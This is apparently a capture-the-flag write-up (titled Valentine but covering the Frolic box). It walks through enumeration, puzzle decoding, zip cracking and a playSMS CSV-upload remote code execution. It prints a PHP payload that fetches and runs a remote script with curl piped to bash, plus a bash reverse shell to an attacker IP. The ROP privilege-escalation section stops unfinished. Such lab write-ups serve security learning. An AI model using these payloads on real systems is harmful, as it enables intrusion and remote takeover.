---
title: HTB - Valentine Write-up
author: bigb0ss
date: 2020-11-16 19:36:00 +0800
categories: [Hack The Box, Linux, Easy]
tags: [hackthebox, frolic, js, Ook!, frackzip, playSMS RCE, binary exploit, rop]
image: /assets/img/post/htb/frolic/01_infocard.png
---

This was an easy difficulty box. Good learning path for:
* 


# Initial Recon

## Nmap

Let’s begin with an initial port scan:

```console
$ nmap -Pn --open -sC -sV -p- 10.10.10.111

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1880/tcp open  http        Node.js (Express middleware)
|_http-title: Node-RED
9999/tcp open  http        nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h44m59s, deviation: 3h10m31s, median: 4m59s
|_nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: frolic
|   NetBIOS computer name: FROLIC\x00
|   Domain name: \x00
|   FQDN: frolic
|_  System time: 2020-11-18T08:21:47+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-11-18T02:51:47
|_  start_date: N/A
```

<b>Interesting Ports to Note</b>

* SMB (445/TCP) - Samba share is always interesting. We can check for something like anonymous share access. But no anonymous access for this host.

* HTTP (1880/TCP) - Node-RED login page. Command logins like `admin : admin` did not work. 

![image](/assets/img/post/htb/frolic/02.png)

* HTTP (9999/TCP) - Default nginx page. Referring to `http://forlic.htb:1880` url. Maybe indicating a vhost routing. I added the above url to my `/etc/hosts` file to check it; however, it wasn't utilizing a vhost. 

![image](/assets/img/post/htb/frolic/03.png)


## Web Directory Enumeration (gobuster)

Let's run `gobuster` against the web service. 

```console
$ gobuster dir -u http://10.10.10.111:9999/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.111:9999/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/17 21:46:17 Starting gobuster
===============================================================
/admin (Status: 301)
/test (Status: 301)
/dev (Status: 301)
/backup (Status: 301)
/loop (Status: 301)
```

It found the several interesting directories. 

`/dev` and `/loop` were forbidden pages.

`/admin` was another login page:

![image](/assets/img/post/htb/frolic/04.png)

`/test` was a `phpinfo()` page:

![image](/assets/img/post/htb/frolic/05.png)

`/backup` had some more interesting files. We can obtain a set of credentials from these files: `admin : imnothuman`. These credentials did not work for both Node-RED and c'mon i m hackable logins. 

![image](/assets/img/post/htb/frolic/06.png)


## Source Code Review (c'mon i m hackable Login)

Next, I quickly checked the source code for the c'mon i m hackable login page and found an interesting JavaScript `login.js`.

![image](/assets/img/post/htb/frolic/07.png)

I was essentially a client-side login script that disclosed the login credentials: `admin : superduperlooperpassword_lol` and the redirecting page after login: `success.html`.

![image](/assets/img/post/htb/frolic/08.png)

The `success.html` was a bunch of weird characters... indicating another puzzle game.

![image](/assets/img/post/htb/frolic/09.png)


## Decoding Ook! Programming Language

Google search found that this was an `Ook! Programing Language` so I used the online decoder to retrieve the following plain-text from it: `Nothing here check /asdiSIAJJ0QWE9JAS`.

![image](/assets/img/post/htb/frolic/10.png)


## Base64 Encoded Zip File

Next, I went to this directory `http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/`, and there was another challenge. It looked like a base64 encoded string. 

![image](/assets/img/post/htb/frolic/11.png)

First attempt to decode the base64 encode string resulted in `invalid input` error. 

```console
root@kali:~/Documents/htb/box/frolic# echo -n "UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA" | base64 -d
PK     É7M#�[�i index.phpUT     �|�[�|�[ux
                                          base64: invalid input
```

I noticed that there were some spaces within the encoded string, so I removed them and attemtped to decode it. And it decoded without any error this time.

```console
root@kali:~/Documents/htb/box/frolic# echo -n "UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA" | sed 's/ //g' | base64 -d
PK     É7M#�[�i index.phpUT     �|�[�|�[ux
                                          ^D�J�s�h�)�P�n
                                                        ��Ss�Jw▒܎��4��k�z��UȖ�+X��P��ᶇ��л�x_�N�[���S��8�����J2S�*�DЍ}�8dTQk������j_���▒���'xc��ݏt��75Q�
                                                                                                                                                       ���k,4��b)�4F��  ���������&q2o�WԜ�9P#�[�iPK É7M#�[�i ▒��index.phpUT�|�[ux
                                                    PKO
```

So, I outputed the result into a file `base64.dec`. When I `file` the file, it was a `zip` file, but it was protected with a password. 

```console
root@kali:~/Documents/htb/box/frolic# echo -n "UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA" | sed 's/ //g' | base64 -d > base64.dec

root@kali:~/Documents/htb/box/frolic# file base64.dec 
base64.dec: Zip archive data, at least v2.0 to extract

root@kali:~/Documents/htb/box/frolic# mv base64.dec base64.zip

root@kali:~/Documents/htb/box/frolic# unzip base64.zip 
Archive:  base64.zip
[base64.zip] index.php password:
```

<b>fcrackzip</b>

Then, I used `fcrackzip` to brute force the password for the `zip` file. The password was `password`.

```console
root@kali:~/Documents/htb/box/frolic# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt base64.zip 


PASSWORD FOUND!!!!: pw == password
```

## Decoding index.php

The output file was looking like this:

```console
root@kali:~/Documents/htb/box/frolic# cat index.php 
4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
```

It looks like a hexdump, so when I reverse them into bytes, it returns to another base64 coded strings.

```console
root@kali:~/Documents/htb/box/frolic# cat index.php | xxd -r -p
KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t
LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==
```

When I decode it, I get another puzzle challege. 

```console
root@kali:~/Documents/htb/box/frolic# cat index.php | xxd -r -p | tr -d '\r\n' | base64 -d
+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
++..<
```

Using the online decoder again `decode.fr`, I was able to recover the plain-text `idkwhatispass`. This could have been a password for `admin` user for the `Node-RED` login; however, it didn't work. Moving on.

![image](/assets/img/post/htb/frolic/12.png)


## Web Directory Enumeration 2 (gobuster)

Next, I did more enumeration against the web directories and found more file under `/dev`. 

```console
root@kali:/opt# gobuster dir -u http://10.10.10.111:9999/dev/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.111:9999/dev/
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/18 19:45:43 Starting gobuster
===============================================================
/test (Status: 200)
/backup (Status: 301)
```

When I go to `http://10.10.10.111:9999/dev/backup/`, I can see another directory called `/playsms`. 

![image](/assets/img/post/htb/frolic/13.png)

And it was login page for `playSMS`.

![image](/assets/img/post/htb/frolic/14.png)


# Initial Foothold

## playSMS (RCE)

Previously found credential set `admin : idkwhatispass` combo allowed me to login to the `playSMS` application.

![image](/assets/img/post/htb/frolic/15.png)

There is a [public exploit](https://www.exploit-db.com/exploits/42044) for `playSMS` where we can upload a malicious .csv file and do remote code exeuction. 

I create the following .csv file which will simply execute `whoami` command. 

```php
root@kali:~/Documents/htb/box/frolic# cat bigb0ss.csv 
<?php echo exec('whoami'); ?>,1
```

Next, I am uploading this file using `Send from file` function under `My account` drop down menu. 

![image](/assets/img/post/htb/frolic/16.png)

Once I hit `UPLOAD FILE`, we can see that our code gets executed and the user id was `www-data`. 

![image](/assets/img/post/htb/frolic/17.png)


## playSMS (Reverse Shell)

I updated my payload as following:

```php
root@kali:~/Documents/htb/box/frolic# cat bigb0ss.csv 
<?php echo exec('curl http://10.10.14.31/rev.sh | bash'); ?>,1
```

It will grep the rev.sh `bash -i >& /dev/tcp/10.10.14.31/9001 0>&1` file from my web server and execute it. Doing that I was able to obtain the reverse shell as `www-data` from the host.

![image](/assets/img/post/htb/frolic/18.png)


# Privilege Escalation

## www-data --> root (ROP Exploit)

<b>user.txt</b>

By searching for `user.txt` file, we can read it.

```console
www-data@frolic:~/html/playsms$ find / -name user.txt 2>/dev/null
/home/ayush/user.txt
/var/www/html/backup/user.txt

www-data@frolic:~/html/playsms$ cat /home/ayush/user.txt
2ab9***REDACTED***2fe0
```

### Binary Exploit (ROP - ret2libc)

Further enum identified an interesting file called `rop`. It just take the user input and print it. We also know that the binary is owned by `root` so it will be some type of binary challege for privilege escalation.

```console
www-data@frolic:/home/ayush/.binary$ ls -la
total 16
drwxrwxr-x 2 ayush ayush 4096 Sep 25  2018 .
drwxr-xr-x 3 ayush ayush 4096 Sep 25  2018 ..
-rwsr-xr-x 1 root  root  7480 Sep 25  2018 rop

www-data@frolic:/home/ayush/.binary$ file rop
rop: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=59da91c100d138c662b77627b65efbbc9f797394, not stripped

www-data@frolic:/home/ayush/.binary$ ./rop 
[*] Usage: program <message>

www-data@frolic:/home/ayush/.binary$ ./rop bigb0ss
[+] Message sent: bigb0ss
```

Using `nc`, we can tranfer the `rop` file to our local box. 

![image](/assets/img/post/htb/frolic/19.png)

### Target Environment Enumeration

Also, it might be a good idea to enum the target environment. 

`uname -a` is telling the Frolic box is x86 (32-bit) machine.

```console
www-data@frolic:/home/ayush/.binary$ uname -a
Linux frolic 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:22:43 UTC 2018 i686 athlon i686 GNU/Linux
```

ASLR is disabled on the box as well. (1 = Enabled; 0 = Disabled)

```console
www-data@frolic:/home/ayush/.binary$ cat /proc/sys/kernel/randomize_va_space 
0
```

### Binary (rop) Enumeration

Let's quickly check if we can cause stack-based BOF to the binary. 

```console
root@kali:~/Documents/htb/box/frolic# ./rop $(python -c 'print "A" * 10')
[+] Message sent: AAAAAAAAAA

root@kali:~/Documents/htb/box/frolic# ./rop $(python -c 'print "A" * 100')
Segmentation fault
```

Ok, so we can confirm if we supply too many strings, we can crash the program. 

Let's do further enumeration about the binary using `gdb` (I am using `gdb-peta`)

First, we can check for its security. And NX (DEP) is only ENABLED. When this option is enabled, it works with the processor to help prevent buffer overflow attacks by blocking code execution from memory that is marked as non-executable. But we can circumvent this by introducing a technique called ROP (Return Oriented Programming). I have written some blog about this previously. It can be found [here](https://medium.com/bugbountywriteup/expdev-exploit-exercise-protostar-stack-6-ef75472ec7c6).




Thanks for reading!